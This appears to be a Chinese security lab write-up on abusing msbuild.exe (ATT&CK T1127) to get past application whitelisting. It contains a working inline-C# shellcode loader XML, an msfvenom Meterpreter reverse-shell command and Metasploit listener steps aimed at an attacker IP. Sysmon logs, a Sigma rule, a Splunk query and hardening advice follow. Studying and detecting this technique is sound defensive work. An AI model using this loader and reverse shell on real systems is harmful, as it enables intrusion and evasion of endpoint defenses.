# T1127-受信任的开发者实用程序代理执行-Msbuild.exe(白名单)

## 描述

攻击者可利用受信任的开发者工具（如`msbuild.exe`）代理执行恶意Payload。`msbuild.exe`是MicrosoftBuildEngine，位于.NETFramework目录，由Microsoft签名，用于构建VisualStudio项目。它支持XML格式的项目文件，允许通过内联任务（InlineTask）嵌入和执行C#代码。

由于其合法签名，`msbuild.exe`可绕过应用程序白名单（如AppLocker）或防病毒软件检测。攻击者通过构造包含恶意C#代码的XML项目文件，利用`msbuild.exe`编译并执行代码，常用于防御规避、持久化或横向移动阶段。

## 测试案例

### 测试案例1：Msbuild.exe执行内联C#代码
`msbuild.exe`通过XML项目文件中的内联任务执行C#代码，加载恶意Shellcode。

**命令**：
```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe malicious.xml
```

- **示例XML文件（malicious.xml）**：
  ```xml
  <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
    <Target Name="ExecutePayload">
      <ClassExample />
    </Target>
    <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
      <Task>
        <Code Type="Class" Language="cs">
        <![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample : Task, ITask
        {
          private static UInt32 MEM_COMMIT = 0x1000;
          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
          [DllImport("kernel32")]
          private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
          [DllImport("kernel32")]
          private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
          [DllImport("kernel32")]
          private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
          public override bool Execute()
          {
            byte[] shellcode = new byte[] { /* 替换为msfvenom生成的Shellcode */ };
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            hThread = CreateThread(0, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return true;
          }
        }
        ]]>
        </Code>
      </Task>
    </UsingTask>
  </Project>
  ```

- **说明**：
  - XML文件定义内联任务，嵌入C#代码，通过`VirtualAlloc`和`CreateThread`执行Shellcode。
  - Shellcode可替换为反弹Shell或其他恶意代码。
- **权限**：普通用户可执行。
- **支持系统**：Windows7、Windows8、Windows8.1、Windows10、WindowsServer2012（需安装.NETFramework4.0）。

## 检测日志

### 数据来源
- Windows安全日志：
  - 事件ID4688：进程创建，记录`msbuild.exe`的执行信息。
- Sysmon日志：
  - 事件ID1：进程创建，包含命令行、哈希值和父进程。
  - 事件ID11：文件创建，记录XML文件或生成的文件。
  - 事件ID10：进程访问，记录子进程调用。
- 文件监控：
  - 检测非开发目录下的XML文件或生成的可执行文件。
- 网络监控：
  - 检测`msbuild.exe`触发的网络连接（如反弹Shell）。

## 测试复现

### 环境准备
- 攻击机：KaliLinux2019
- 靶机：WindowsServer2012（需安装.NETFramework4.0）
- 工具：
  - MetasploitFramework（生成Payload和监听）
  - Sysmon（可选，日志收集）

### 攻击分析

#### 测试1：Msbuild.exe执行恶意Shellcode
1. **生成Shellcode**：
   ```bash
   msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f csharp
   ```
  - 输出C#格式Shellcode，复制到`malicious.xml`的`byte[] shellcode`中。
  
    ![载荷](https://img-blog.csdnimg.cn/20200413135116398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70)

2. **创建XML文件**：
   在靶机创建`malicious.xml`，将Shellcode替换到上述示例XML的`shellcode`数组中。
   ![XML文件设置](https://img-blog.csdnimg.cn/20200413135530841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70)

3. **配置攻击机监听**：
   ```bash
   msf5>use exploit/multi/handler
   msf5 exploit(multi/handler)>set payload windows/meterpreter/reverse_tcp
   msf5 exploit(multi/handler)>set LHOST 192.168.126.146
   msf5 exploit(multi/handler)>set LPORT 4444
   msf5 exploit(multi/handler)>exploit
   ```
   ![监听](https://img-blog.csdnimg.cn/20200413140326808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70)

4. **靶机执行Payload**：
   将`malicious.xml`复制到靶机（如`C:\Users\admin\`），执行：
   ```cmd
   C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe C:\Users\admin\malicious.xml
   ```
   ![加载payload](https://img-blog.csdnimg.cn/20200413140707313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70)

5. **结果分析**：
   - 成功：`msbuild.exe`编译并执行Shellcode，获得Meterpreter会话，`getuid`显示用户为`WIN-SERVER\admin`。
   - 失败可能：
     - .NETFramework4.0未安装。
     - 防火墙阻止TCP4444连接。
     - Shellcode架构不匹配（需生成x86或x64版本以适配靶机）。
     - XML文件格式错误（如缺少CDATA或语法错误）。

   ![反弹会话](https://img-blog.csdnimg.cn/20200413140810400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70)

## 测试留痕

### Windows安全日志
- 事件ID4688：
  ```
  进程信息:
    新进程ID:0x1234
    新进程名称:C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe
    命令行:C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe C:\Users\admin\malicious.xml
    创建者进程名称:C:\Windows\System32\cmd.exe
  ```
  ![日志留痕](https://img-blog.csdnimg.cn/20200413140937397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70)

### Sysmon日志
- 事件ID1：
  ```
  事件ID:1
  OriginalFileName:msbuild.exe
  CommandLine:C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe C:\Users\admin\malicious.xml
  CurrentDirectory:C:\Users\admin\
  User:WIN-SERVER\admin
  Hashes:SHA1=1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B
  ParentImage:C:\Windows\System32\cmd.exe
  ```
- 事件ID11：
  ```
  事件ID:11
  Image:C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe
  TargetFilename:C:\Users\admin\malicious.xml
  ```
- 事件ID3：
  ```
  事件ID:3
  Image:C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe
  Initiated:true
  SourceIp:192.168.126.149
  SourcePort:49163
  DestinationIp:192.168.126.146
  DestinationPort:4444
  ```

## 检测规则/思路

### 检测方法
1. 进程监控：
   - 检测`msbuild.exe`的执行，特别是在非开发环境中的调用。
   - 检查命令行是否包含`.xml`文件。
2. 命令行分析：
   - 正则表达式匹配：
     ```regex
     msbuild\.exe.*\.xml
     ```
3. 文件监控：
   - 检测非开发目录下的XML文件，尤其是包含`CodeTaskFactory`或`InlineTask`的XML。
4. 网络监控：
   - 检测`msbuild.exe`触发的异常网络连接（如TCP4444）。
5. 行为分析：
   - 检测`msbuild.exe`执行后触发的子进程或内存分配行为。

### Sigma规则
新增Sigma规则以增强检测：
```yaml
title:可疑Msbuild.exe执行XML文件
id:9a8b7c6d-5e4f-3a2b-1c0d-9e8f7a6b5c4d
description:检测msbuild.exe执行XML文件，可能用于代理执行恶意代码
status:experimental
logsource:
  category:process_creation
  product:windows
detection:
  selection:
    Image|endswith:'\msbuild.exe'
    CommandLine|contains:'.xml'
  filter_legitimate:
    CurrentDirectory|contains:
      - 'C:\Program Files\'
      - 'C:\Program Files (x86)\'
  condition:selection and not filter_legitimate
fields:
  - Image
  - CommandLine
  - ParentImage
  - User
falsepositives:
  - 合法的开发活动
level:high
tags:
  - attack.execution
  - attack.t1127
```

规则说明：
- 目标：检测`msbuild.exe`执行XML文件的异常行为。
- 过滤：排除开发目录（如`ProgramFiles`）中的合法操作。
- 日志来源：Windows事件ID4688（需启用命令行审计）或Sysmon事件ID1。
- 误报处理：开发环境可能触发，需结合目录和网络行为分析。
- 级别：标记为“高”优先级，因`msbuild.exe`滥用通常与恶意活动相关。

### Splunk规则
```spl
index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational"
(EventCode=1 Image="*\msbuild.exe" CommandLine="*.xml*")
OR (EventCode=11 FileName="*.xml" TargetFilename="*\msbuild.exe")
OR (EventCode=3 Initiated="true" SourceImage="*\msbuild.exe" DestinationPort="4444")
| fields Image,CommandLine,ParentImage,User,TargetFilename,DestinationIp,DestinationPort
```

规则说明：
- 检测`msbuild.exe`执行XML文件、访问的XML文件和触发的网络连接。
- 减少误报：结合文件路径和网络行为分析。

### 检测挑战
- 误报：合法开发活动可能触发，需建立开发环境基线。
- 日志依赖：默认日志可能不记录完整命令行，需部署Sysmon或增强日志策略。
- 绕过360：部分测试表明`msbuild.exe`可能绕过360安全卫士，但需进一步验证。

## 防御建议
1. 监控和日志：
   - 启用命令行审计策略，确保事件ID4688记录完整参数。
   - 部署Sysmon，配置针对`msbuild.exe`的规则，监控文件创建和网络活动。
2. 权限控制：
   - 限制非开发用户执行`msbuild.exe`的权限。
3. 文件审查：
   - 定期扫描非开发目录下的XML文件，检查是否包含`CodeTaskFactory`或`InlineTask`。
4. 行为基线：
   - 建立开发环境的`msbuild.exe`使用基线，检测异常行为。
5. 安全更新：
   - 保持Windows和.NETFramework更新，修复潜在漏洞。

## 参考推荐
- MITREATT&CKT1127:  
  <https://attack.mitre.org/techniques/T1127/>
- 利用msbuild.exe绕过应用程序白名单安全机制:  
  <https://www.freebuf.com/articles/network/197706.html>
- GreatSCT|MSF|白名单:  
  <http://www.secist.com/archives/6082.html>
- 基于白名单Msbuild.exe执行Payload复现:  
  <https://blog.csdn.net/ws13129/article/details/89736941>
- 检测白名单Msbuild.exe执行Payload:  
  <https://blog.csdn.net/qq_36334464/article/details/105487176>
- 基于白名单执行Payload:  
  <https://www.jianshu.com/p/cdb1867c6abb>
- Sysmon配置与检测:  
  <https://github.com/SwiftOnSecurity/sysmon-config>
- MetasploitFramework:用于生成和测试反弹Shell。  
  <https://www.metasploit.com/>
- Sysmon:Microsoft提供的系统监控工具。  
  <https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon>
